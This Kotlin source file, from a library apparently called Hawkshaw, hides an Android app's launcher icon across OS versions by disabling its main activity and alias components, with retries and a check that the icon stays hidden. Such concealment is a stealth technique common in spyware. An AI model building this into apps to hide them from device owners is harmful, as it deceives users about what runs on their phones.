package com.hawkshaw.library.features.ui

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.*

/**
 * Perfect app icon hiding system that works across all Android versions
 */
object AppIconManager {
    private const val TAG = "AppIconManager"
    
    // Main launcher activity component
    private const val MAIN_ACTIVITY = "com.hawkshaw.app.MainActivity"
    
    // Alias activities for different Android versions
    private const val ALIAS_ACTIVITY_1 = "com.hawkshaw.app.MainActivityAlias1"
    private const val ALIAS_ACTIVITY_2 = "com.hawkshaw.app.MainActivityAlias2"
    private const val ALIAS_ACTIVITY_3 = "com.hawkshaw.app.MainActivityAlias3"
    
    private var isHidden = false
    private var currentActiveAlias: String? = null
    
    /**
     * Hide app icon perfectly across all Android versions
     */
    fun hideAppIcon(context: Context) {
        try {
            Logger.i(TAG, "Starting perfect app icon hiding process")
            
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                    // Android 11+ (API 30+) - Use alias switching method
                    hideIconWithAliasMethod(context)
                }
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> {
                    // Android 8.0-10 (API 26-29) - Use component state method
                    hideIconWithComponentState(context)
                }
                else -> {
                    // Android 7.1 and below (API 25-) - Use legacy method
                    hideIconLegacyMethod(context)
                }
            }
            
            isHidden = true
            Logger.i(TAG, "App icon hidden successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide app icon", e)
            // Fallback to basic method
            try {
                hideIconBasicMethod(context)
                isHidden = true
                Logger.i(TAG, "App icon hidden using fallback method")
            } catch (fallbackError: Exception) {
                Log.e(TAG, "Fallback method also failed", fallbackError)
            }
        }
    }
    
    /**
     * Show app icon (restore visibility)
     */
    fun showAppIcon(context: Context) {
        try {
            Logger.i(TAG, "Restoring app icon visibility")
            
            // Enable main activity
            val mainComponent = ComponentName(context, MAIN_ACTIVITY)
            context.packageManager.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // Disable any active aliases
            disableAllAliases(context)
            
            isHidden = false
            currentActiveAlias = null
            Logger.i(TAG, "App icon restored successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restore app icon", e)
        }
    }
    
    /**
     * Check if app icon is currently hidden
     */
    fun isAppIconHidden(): Boolean = isHidden
    
    /**
     * Android 11+ method using launcher alias switching
     */
    private fun hideIconWithAliasMethod(context: Context) {
        Log.d(TAG, "Using alias method for Android 11+")
        
        try {
            val packageManager = context.packageManager
            
            // Get the main activity component
            val mainActivity = ComponentName(context, MAIN_ACTIVITY)
            
            // Get one of the alias components (using correct name from manifest)
            val aliasActivity = ComponentName(context, ALIAS_ACTIVITY_1)
            
            // Enable the alias first
            packageManager.setComponentEnabledSetting(
                aliasActivity,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // Wait a moment for the change to take effect
            Thread.sleep(100)
            
            // Now disable the main activity
            packageManager.setComponentEnabledSetting(
                mainActivity,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // Disable the alias to hide icon
            packageManager.setComponentEnabledSetting(
                aliasActivity,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            Logger.i(TAG, "Successfully used alias method to hide app icon")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide icon with alias method", e)
            throw e
        }
    }
    
    /**
     * Android 8-10 method using component state management
     */
    private fun hideIconWithComponentState(context: Context) {
        Log.d(TAG, "Using component state method for Android 8-10")
        
        val packageManager = context.packageManager
        val mainComponent = ComponentName(context, MAIN_ACTIVITY)
        
        try {
            // Method 1: Direct disable
            packageManager.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                PackageManager.DONT_KILL_APP
            )
            
            Log.d(TAG, "Component state method completed successfully")
            
        } catch (e: Exception) {
            Log.w(TAG, "Direct disable failed, trying alternative method", e)
            
            // Method 2: Alternative disable
            packageManager.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
    
    /**
     * Legacy method for older Android versions
     */
    private fun hideIconLegacyMethod(context: Context) {
        Log.d(TAG, "Using legacy method for Android 7.1 and below")
        
        val packageManager = context.packageManager
        val mainComponent = ComponentName(context, MAIN_ACTIVITY)
        
        try {
            packageManager.setComponentEnabledSetting(
                mainComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            
            Log.d(TAG, "Legacy method completed successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Legacy method failed", e)
            throw e
        }
    }
    
    /**
     * Basic fallback method
     */
    private fun hideIconBasicMethod(context: Context) {
        Log.d(TAG, "Using basic fallback method")
        
        val packageManager = context.packageManager
        val mainComponent = ComponentName(context, MAIN_ACTIVITY)
        
        packageManager.setComponentEnabledSetting(
            mainComponent,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            0 // No flags
        )
        
        Log.d(TAG, "Basic method completed")
    }
    
    /**
     * Disable all alias activities
     */
    private fun disableAllAliases(context: Context) {
        val aliases = listOf(ALIAS_ACTIVITY_1, ALIAS_ACTIVITY_2, ALIAS_ACTIVITY_3)
        val packageManager = context.packageManager
        
        aliases.forEach { alias ->
            try {
                val aliasComponent = ComponentName(context, alias)
                packageManager.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.w(TAG, "Failed to disable alias: $alias", e)
            }
        }
    }
    
    /**
     * Advanced icon hiding with retry mechanism
     */
    fun hideAppIconWithRetry(context: Context, maxRetries: Int = 3) {
        var attempts = 0
        var success = false
        
        while (attempts < maxRetries && !success) {
            try {
                attempts++
                Log.i(TAG, "Attempting to hide app icon (attempt $attempts/$maxRetries)")
                
                hideAppIcon(context)
                
                // Verify hiding was successful
                Thread.sleep(500) // Wait for system to process
                
                val mainComponent = ComponentName(context, MAIN_ACTIVITY)
                val componentState = context.packageManager.getComponentEnabledSetting(mainComponent)
                
                if (componentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                    componentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
                    success = true
                    Log.i(TAG, "App icon hiding verified successful")
                } else {
                    Log.w(TAG, "App icon hiding verification failed, component state: $componentState")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Attempt $attempts failed", e)
                if (attempts < maxRetries) {
                    Thread.sleep(1000) // Wait before retry
                }
            }
        }
        
        if (!success) {
            Log.e(TAG, "Failed to hide app icon after $maxRetries attempts")
        }
    }
    
    /**
     * Get current icon visibility status
     */
    fun getIconStatus(context: Context): IconStatus {
        return try {
            val mainComponent = ComponentName(context, MAIN_ACTIVITY)
            val componentState = context.packageManager.getComponentEnabledSetting(mainComponent)
            
            when (componentState) {
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> IconStatus.VISIBLE
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER -> IconStatus.HIDDEN
                else -> IconStatus.UNKNOWN
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to get icon status", e)
            IconStatus.ERROR
        }
    }
    
    enum class IconStatus {
        VISIBLE,
        HIDDEN,
        UNKNOWN,
        ERROR
    }
}
